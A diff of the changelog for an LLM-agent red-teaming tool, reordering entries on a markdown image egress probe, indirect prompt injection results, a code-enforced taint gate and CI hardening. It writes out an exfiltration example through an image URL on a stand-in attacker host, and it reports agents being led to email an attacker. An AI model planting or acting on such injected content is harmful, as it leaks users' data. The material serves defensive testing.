@@ -7,6 +7,74 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Added
+
+- **Markdown image/link egress probe (W3).** New opt-in attack module,
+  `markdown_egress`, closing issue #130: plants a note whose markdown embeds
+  an attacker-controlled image URL (`![](http://attacker.example.com/...)`)
+  alongside an in-character reason for the planner to resolve it. The
+  destination travels as formatted content rather than a named tool
+  argument, so allowlists that only inspect declared arguments to a known
+  sink can miss it. Reuses the shared `egress_reached_probe_destination`
+  predicate; ships no new oracle.
+- **Contributor guardrails.** The repository now defends the machinery that
+  checks contributions, not just the contributions. Relevant if you are opening
+  a pull request: see the new
+  ["What we can and can't accept"](CONTRIBUTING.md#what-we-can-and-cant-accept).
+
+  - **`main` is now protected by a repository ruleset** requiring one approving
+    review, code-owner review, stale-review dismissal on push, and the `lint` /
+    `typecheck` / `test` / `precommit` / `security` checks. `security` was never
+    a required check before, so `bandit`, `detect-secrets` and `pip-audit` could
+    all go red without blocking a merge. `.github/CODEOWNERS` stays a single
+    catch-all, so code-owner review applies to every path; the **trust base**
+    (workflows, `gate-action/`, `.pre-commit-config.yaml`, `pyproject.toml`,
+    `scripts/`, `.secrets.baseline`, `reference_targets/`) is documented in
+    CONTRIBUTING.md, and gets its own CODEOWNERS entries once a second
+    maintainer makes them mean something. Repository admins are a bypass actor
+    while there is a single maintainer, who otherwise could not merge at all;
+    see [GOVERNANCE.md](GOVERNANCE.md#branch-protection) for the trigger to
+    remove it. The ruleset does not require branches to be up to date before
+    merging — pull requests are already built against the merge result, so it
+    would mostly serialise merges. This replaces the older per-branch protection
+    settings rather than sitting alongside them.
+  - `scripts/check_reference_target_inert.py` pins the property that makes the
+    deliberately-vulnerable reference target auditable: the package is inert, so
+    it cannot reach the network, spawn a process, or execute constructed code.
+    Insecure code is expected there, which is exactly what makes it the cheapest
+    place to hide a real backdoor — "it's intentional, see the seed catalogue"
+    is unfalsifiable by eye. The guard confines the transport stack (`asyncio`,
+    `mcp`) to the one file that speaks the wire protocol, requires capable
+    packages to be imported `from` rather than bound as a name, and requires the
+    tools `_call_tool` dispatches on to equal the tools `list_tools` declares —
+    an undeclared branch is reachable, because the stdio layer forwards any name
+    straight through. Runs in pre-commit and the test suite.
+  - OpenSSF Scorecard runs weekly, with results in the Security tab, so a later
+    change that undoes this work shows up as a score drop. Not badged in the
+    README yet — see SECURITY.md for why.
+  - No CodeQL workflow was added: CodeQL is already running here via GitHub's
+    default setup, covering both `python` and `actions`. An advanced
+    configuration cannot upload results while default setup is enabled, so
+    adding one would have replaced a working analysis with a permanently
+    failing job.
+  - `zizmor` and `actionlint` now lint the workflows themselves — previously the
+    one class of file that could silence every other check went unchecked. Both
+    run in the `precommit` CI job. `zizmor` is also a local pre-commit hook;
+    `actionlint` is not, because its hook is `language: golang` and pre-commit
+    bootstraps a Go toolchain when `go` is absent — a ~100MB download and a
+    local compile triggered by an unrelated typo.
+  - Private vulnerability reporting is enabled, so the GitHub Security Advisory
+    link SECURITY.md gives as the preferred reporting channel now resolves.
+    Workflows from forks require maintainer approval for all outside
+    contributors, not only first-time ones: the argument for keeping enforcement
+    off the workflow layer applies at least as strongly to running a fork's
+    workflow at all.
+  - Dependabot updates wait 7 days (`cooldown`). Package compromises follow a
+    shape: a malicious version is published, sits live for hours to days, then
+    is yanked once someone notices. Zero cooldown opened a PR into this repo
+    during exactly that window, with CI green because the package installs
+    fine. Security updates bypass cooldown, so CVE fixes still arrive at once.
+
 ### Changed
 
 - **`mcp-kitchen-sink` source is now 0.2.0, and publishing it is a release
@@ -61,93 +129,24 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   artefacts off disk and dropping it would silently start reading old
   no-verdict attempts as clean resistance.
 
-### Security
 
-- **The differential oracle no longer reports KEPT without proof that the guard
-  held.** `_validate_reference` computed how many iterations the guarded twin
-  *positively resisted* on and then never passed that number to the decision
-  helper. Because an attempt that reached no verdict counts as neither
-  "resisted" nor "fired", such a run left `guard_fires` at 0 — so the
-  success-rate gap read a perfect 1.0 and both the `differential` and
-  `flakiness` legs passed. A test could therefore be KEPT off a guarded twin
-  that never demonstrated anything, while the build silently degraded to
-  collect-only and the CLI told the operator to commit fixtures that were never
-  written. This is the same "absence of failure is not proof of resistance" bug
-  already fixed in `_resisted` and the testkit, sitting in the oracle itself.
-- **`mylonite demo` now replays fixtures recorded against a self-hosted model.**
-  `DEMO_PROVIDER`/`DEMO_MODEL` move from `anthropic`/`claude-haiku-4-5-20251001`
-  to `ollama`/`ollama_chat/qwen3:4b-instruct-2507-q4_K_M`, and all 48 fixtures
-  are re-recorded. The demo needs no API key, but its own provenance line named
-  a hosted model, so the one command a newcomer runs first could not actually be
-  reproduced without a paid account. It now can:
-  `ollama pull qwen3:4b-instruct-2507-q4_K_M` and
-  `python scripts/record_demo_fixtures.py --force`.
-
-  The differential strengthens rather than weakens: **5 exploits on vulnerable,
-  0 on guarded** (was 2 and 0), and three of the four guarded cells are now
-  decided clean where W1's was previously grey. Two cells remain ⚠ and the
-  coverage note says so — W1 on the vulnerable twin, which neither local
-  planner lands (see the W1 entry below), and W2 on the guarded twin, where one
-  of three seeds positively observed the taint gate refusing and the other two
-  were never attempted against that build. A ⚠ cell is not a clean one, and the
-  demo does not present it as one. `demo --help`, the
-  record-script instructions, and the "no provider reachable" error all follow
-  the new default: that error used to open by telling you to set a hosted
-  vendor's API key, which the default configuration does not use and which
-  would not fix the likely cause — a local model server that is not running.
-
-  `_decide` now requires `guard_resists` and a `min_guard_resist_rate`
-  (default 0.6, matching the metamorphic threshold's rationale): the guard must
-  have positively demonstrated resistance at least once for the test to
-  discriminate at all, and on a majority of runs for the result to be
-  significant. Since `max_guard_leak` is 0.0, that floor is precisely a cap on
-  *inconclusive* guarded runs — at the default 5 iterations, 3 must be decided
-  and 2 may not be. The reference path additionally requires at least one run
-  that BOTH fired and resisted, which is the same precondition fixture
-  recording needs, so the verdict and the artefact on disk can no longer
-  disagree.
-
-  The custom-target path was worse: it derived the count as
-  `n - guard_fired`, so every `error` and `skipped_*` counted as the control
-  holding and a guarded twin whose every run errored reported *perfect*
-  control. It now reports the genuine count from the same `_resisted` helper.
-
-  Discrimination strength changes meaning with it: `(vuln_rate +
-  guard_resist_rate) / 2` instead of `(vuln_rate + (1 - guard_rate)) / 2`, so a
-  never-exercised guard scores 0.5 rather than the old perfect 1.0. That number
-  is published in the report, SARIF and bundle.
-
-  **Migration:** live `validate` and `gate` runs may now reject where they
-  previously kept. The rejection detail names the cause — `guarded RESISTED
-  k/n`, `reached no verdict j/n` — so an undecided judge reads as an undecided
-  judge rather than a failed guard. `gate`'s default of 3 iterations tolerates
-  one inconclusive run.
-- **The guarded reference twin's W2 mitigation is now enforced in code, not
-  requested of the model.** Its defence against indirect injection was a
-  prompt-level `<untrusted>` envelope, which only holds if the planner chooses to
-  honour it. Measurement showed it does not: driven by a capable 4B local planner,
-  the guarded build was walked into emailing an attacker on **40–100% of runs**,
-  and the leak rate swung purely with the attacker's *phrasing* — 0% under one
-  wording, 100% under another. A control whose hold depends on the payload's
-  prose is not a control, and every W2 regression test validated against it was
-  resting on model goodwill.
-
-  A taint gate (M5) replaces that dependence: once a turn consumes untrusted
-  content — any successful `read_note` or `web_fetch` — the egress tools
-  (`send_email`, `web_fetch`) are refused for the rest of that turn, in server
-  code, regardless of what the planner decides. `web_fetch` is deliberately both
-  source and sink, which also closes "fetch an allowed page, then egress what it
-  told you to". W2 now carries the same class of structural guarantee W3's
-  allowlist and W4's two-step confirm already did.
-
-  The envelope is retained as defence in depth, so the byte-for-byte parity with
-  `scan._control_primitives.quarantine` is unchanged. The vulnerable twin is
-  untouched — it must stay exploitable, or the differential proves nothing.
-
-  **Deliberately blunt:** the gate also refuses a *benign* read-then-send in the
-  same turn. That is the intended trade — a false refusal is recoverable, a false
-  permit exfiltrates — and it is the honest shape of a boundary control that
-  cannot read intent. `begin_turn()` clears the taint for multi-turn sessions.
+- `pip-audit` in CI is a real gate. It carried `continue-on-error: true`, which
+  did more than its comment justified: dropping `--strict` already avoids the
+  editable-install false failure, so the flag was additionally swallowing real
+  dependency CVEs. Note this only became a *merge* gate once `security` was
+  added to the required checks above — the flag alone would have made the job
+  red without blocking anything.
+- Every `actions/checkout` sets `persist-credentials: false`, so a checkout does
+  not leave usable credentials behind while CI installs and executes
+  pull-request code. (`actions/checkout` v6+ stores them under `$RUNNER_TEMP`
+  rather than `.git/config`, which narrows the exposure but does not remove it.)
+  The one job that genuinely needs those credentials, docs deployment, was split
+  out of the docs build for this reason.
+- `Docs` workflow is two jobs. `contents: write` was granted workflow-wide while
+  the workflow also triggered on `pull_request`, so every documentation pull
+  request ran under a write-scoped token it had no use for.
+- Repository Actions policy restricts runnable actions to GitHub-owned plus an
+  explicit allowlist, and requires SHA pinning.
 
 ### Fixed
 
@@ -419,95 +418,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   doubles now key on the response-schema key `harmful_intent_present`, and each
   file carries a guard asserting the marker against the live prompt.
 
-### Added
-
-- **Markdown image/link egress probe (W3).** New opt-in attack module,
-  `markdown_egress`, closing issue #130: plants a note whose markdown embeds
-  an attacker-controlled image URL (`![](http://attacker.example.com/...)`)
-  alongside an in-character reason for the planner to resolve it. The
-  destination travels as formatted content rather than a named tool
-  argument, so allowlists that only inspect declared arguments to a known
-  sink can miss it. Reuses the shared `egress_reached_probe_destination`
-  predicate; ships no new oracle.
-- **Contributor guardrails.** The repository now defends the machinery that
-  checks contributions, not just the contributions. Relevant if you are opening
-  a pull request: see the new
-  ["What we can and can't accept"](CONTRIBUTING.md#what-we-can-and-cant-accept).
-
-  - **`main` is now protected by a repository ruleset** requiring one approving
-    review, code-owner review, stale-review dismissal on push, and the `lint` /
-    `typecheck` / `test` / `precommit` / `security` checks. `security` was never
-    a required check before, so `bandit`, `detect-secrets` and `pip-audit` could
-    all go red without blocking a merge. `.github/CODEOWNERS` stays a single
-    catch-all, so code-owner review applies to every path; the **trust base**
-    (workflows, `gate-action/`, `.pre-commit-config.yaml`, `pyproject.toml`,
-    `scripts/`, `.secrets.baseline`, `reference_targets/`) is documented in
-    CONTRIBUTING.md, and gets its own CODEOWNERS entries once a second
-    maintainer makes them mean something. Repository admins are a bypass actor
-    while there is a single maintainer, who otherwise could not merge at all;
-    see [GOVERNANCE.md](GOVERNANCE.md#branch-protection) for the trigger to
-    remove it. The ruleset does not require branches to be up to date before
-    merging — pull requests are already built against the merge result, so it
-    would mostly serialise merges. This replaces the older per-branch protection
-    settings rather than sitting alongside them.
-  - `scripts/check_reference_target_inert.py` pins the property that makes the
-    deliberately-vulnerable reference target auditable: the package is inert, so
-    it cannot reach the network, spawn a process, or execute constructed code.
-    Insecure code is expected there, which is exactly what makes it the cheapest
-    place to hide a real backdoor — "it's intentional, see the seed catalogue"
-    is unfalsifiable by eye. The guard confines the transport stack (`asyncio`,
-    `mcp`) to the one file that speaks the wire protocol, requires capable
-    packages to be imported `from` rather than bound as a name, and requires the
-    tools `_call_tool` dispatches on to equal the tools `list_tools` declares —
-    an undeclared branch is reachable, because the stdio layer forwards any name
-    straight through. Runs in pre-commit and the test suite.
-  - OpenSSF Scorecard runs weekly, with results in the Security tab, so a later
-    change that undoes this work shows up as a score drop. Not badged in the
-    README yet — see SECURITY.md for why.
-  - No CodeQL workflow was added: CodeQL is already running here via GitHub's
-    default setup, covering both `python` and `actions`. An advanced
-    configuration cannot upload results while default setup is enabled, so
-    adding one would have replaced a working analysis with a permanently
-    failing job.
-  - `zizmor` and `actionlint` now lint the workflows themselves — previously the
-    one class of file that could silence every other check went unchecked. Both
-    run in the `precommit` CI job. `zizmor` is also a local pre-commit hook;
-    `actionlint` is not, because its hook is `language: golang` and pre-commit
-    bootstraps a Go toolchain when `go` is absent — a ~100MB download and a
-    local compile triggered by an unrelated typo.
-  - Private vulnerability reporting is enabled, so the GitHub Security Advisory
-    link SECURITY.md gives as the preferred reporting channel now resolves.
-    Workflows from forks require maintainer approval for all outside
-    contributors, not only first-time ones: the argument for keeping enforcement
-    off the workflow layer applies at least as strongly to running a fork's
-    workflow at all.
-  - Dependabot updates wait 7 days (`cooldown`). Package compromises follow a
-    shape: a malicious version is published, sits live for hours to days, then
-    is yanked once someone notices. Zero cooldown opened a PR into this repo
-    during exactly that window, with CI green because the package installs
-    fine. Security updates bypass cooldown, so CVE fixes still arrive at once.
-
-### Changed
-
-- `pip-audit` in CI is a real gate. It carried `continue-on-error: true`, which
-  did more than its comment justified: dropping `--strict` already avoids the
-  editable-install false failure, so the flag was additionally swallowing real
-  dependency CVEs. Note this only became a *merge* gate once `security` was
-  added to the required checks above — the flag alone would have made the job
-  red without blocking anything.
-- Every `actions/checkout` sets `persist-credentials: false`, so a checkout does
-  not leave usable credentials behind while CI installs and executes
-  pull-request code. (`actions/checkout` v6+ stores them under `$RUNNER_TEMP`
-  rather than `.git/config`, which narrows the exposure but does not remove it.)
-  The one job that genuinely needs those credentials, docs deployment, was split
-  out of the docs build for this reason.
-- `Docs` workflow is two jobs. `contents: write` was granted workflow-wide while
-  the workflow also triggered on `pull_request`, so every documentation pull
-  request ran under a write-scoped token it had no use for.
-- Repository Actions policy restricts runnable actions to GitHub-owned plus an
-  explicit allowlist, and requires SHA pinning.
-
-### Fixed
 
 - `gate-action/action.yml` pinned `actions/setup-python@v6` by moving tag and
   interpolated its inputs directly into a `run:` block. Both are more serious
@@ -516,6 +426,94 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   every consumer at once, and `${{ }}` is substituted before bash parses the
   script, so an input containing shell syntax became shell syntax. Now
   SHA-pinned, with inputs passed through the environment.
+
+### Security
+
+- **The differential oracle no longer reports KEPT without proof that the guard
+  held.** `_validate_reference` computed how many iterations the guarded twin
+  *positively resisted* on and then never passed that number to the decision
+  helper. Because an attempt that reached no verdict counts as neither
+  "resisted" nor "fired", such a run left `guard_fires` at 0 — so the
+  success-rate gap read a perfect 1.0 and both the `differential` and
+  `flakiness` legs passed. A test could therefore be KEPT off a guarded twin
+  that never demonstrated anything, while the build silently degraded to
+  collect-only and the CLI told the operator to commit fixtures that were never
+  written. This is the same "absence of failure is not proof of resistance" bug
+  already fixed in `_resisted` and the testkit, sitting in the oracle itself.
+- **`mylonite demo` now replays fixtures recorded against a self-hosted model.**
+  `DEMO_PROVIDER`/`DEMO_MODEL` move from `anthropic`/`claude-haiku-4-5-20251001`
+  to `ollama`/`ollama_chat/qwen3:4b-instruct-2507-q4_K_M`, and all 48 fixtures
+  are re-recorded. The demo needs no API key, but its own provenance line named
+  a hosted model, so the one command a newcomer runs first could not actually be
+  reproduced without a paid account. It now can:
+  `ollama pull qwen3:4b-instruct-2507-q4_K_M` and
+  `python scripts/record_demo_fixtures.py --force`.
+
+  The differential strengthens rather than weakens: **5 exploits on vulnerable,
+  0 on guarded** (was 2 and 0), and three of the four guarded cells are now
+  decided clean where W1's was previously grey. Two cells remain ⚠ and the
+  coverage note says so — W1 on the vulnerable twin, which neither local
+  planner lands (see the W1 entry below), and W2 on the guarded twin, where one
+  of three seeds positively observed the taint gate refusing and the other two
+  were never attempted against that build. A ⚠ cell is not a clean one, and the
+  demo does not present it as one. `demo --help`, the
+  record-script instructions, and the "no provider reachable" error all follow
+  the new default: that error used to open by telling you to set a hosted
+  vendor's API key, which the default configuration does not use and which
+  would not fix the likely cause — a local model server that is not running.
+
+  `_decide` now requires `guard_resists` and a `min_guard_resist_rate`
+  (default 0.6, matching the metamorphic threshold's rationale): the guard must
+  have positively demonstrated resistance at least once for the test to
+  discriminate at all, and on a majority of runs for the result to be
+  significant. Since `max_guard_leak` is 0.0, that floor is precisely a cap on
+  *inconclusive* guarded runs — at the default 5 iterations, 3 must be decided
+  and 2 may not be. The reference path additionally requires at least one run
+  that BOTH fired and resisted, which is the same precondition fixture
+  recording needs, so the verdict and the artefact on disk can no longer
+  disagree.
+
+  The custom-target path was worse: it derived the count as
+  `n - guard_fired`, so every `error` and `skipped_*` counted as the control
+  holding and a guarded twin whose every run errored reported *perfect*
+  control. It now reports the genuine count from the same `_resisted` helper.
+
+  Discrimination strength changes meaning with it: `(vuln_rate +
+  guard_resist_rate) / 2` instead of `(vuln_rate + (1 - guard_rate)) / 2`, so a
+  never-exercised guard scores 0.5 rather than the old perfect 1.0. That number
+  is published in the report, SARIF and bundle.
+
+  **Migration:** live `validate` and `gate` runs may now reject where they
+  previously kept. The rejection detail names the cause — `guarded RESISTED
+  k/n`, `reached no verdict j/n` — so an undecided judge reads as an undecided
+  judge rather than a failed guard. `gate`'s default of 3 iterations tolerates
+  one inconclusive run.
+- **The guarded reference twin's W2 mitigation is now enforced in code, not
+  requested of the model.** Its defence against indirect injection was a
+  prompt-level `<untrusted>` envelope, which only holds if the planner chooses to
+  honour it. Measurement showed it does not: driven by a capable 4B local planner,
+  the guarded build was walked into emailing an attacker on **40–100% of runs**,
+  and the leak rate swung purely with the attacker's *phrasing* — 0% under one
+  wording, 100% under another. A control whose hold depends on the payload's
+  prose is not a control, and every W2 regression test validated against it was
+  resting on model goodwill.
+
+  A taint gate (M5) replaces that dependence: once a turn consumes untrusted
+  content — any successful `read_note` or `web_fetch` — the egress tools
+  (`send_email`, `web_fetch`) are refused for the rest of that turn, in server
+  code, regardless of what the planner decides. `web_fetch` is deliberately both
+  source and sink, which also closes "fetch an allowed page, then egress what it
+  told you to". W2 now carries the same class of structural guarantee W3's
+  allowlist and W4's two-step confirm already did.
+
+  The envelope is retained as defence in depth, so the byte-for-byte parity with
+  `scan._control_primitives.quarantine` is unchanged. The vulnerable twin is
+  untouched — it must stay exploitable, or the differential proves nothing.
+
+  **Deliberately blunt:** the gate also refuses a *benign* read-then-send in the
+  same turn. That is the intended trade — a false refusal is recoverable, a false
+  permit exfiltrates — and it is the honest shape of a boundary control that
+  cannot read intent. `begin_turn()` clears the taint for multi-turn sessions.
 
 ## [0.9.0] - 2026-08-28
 
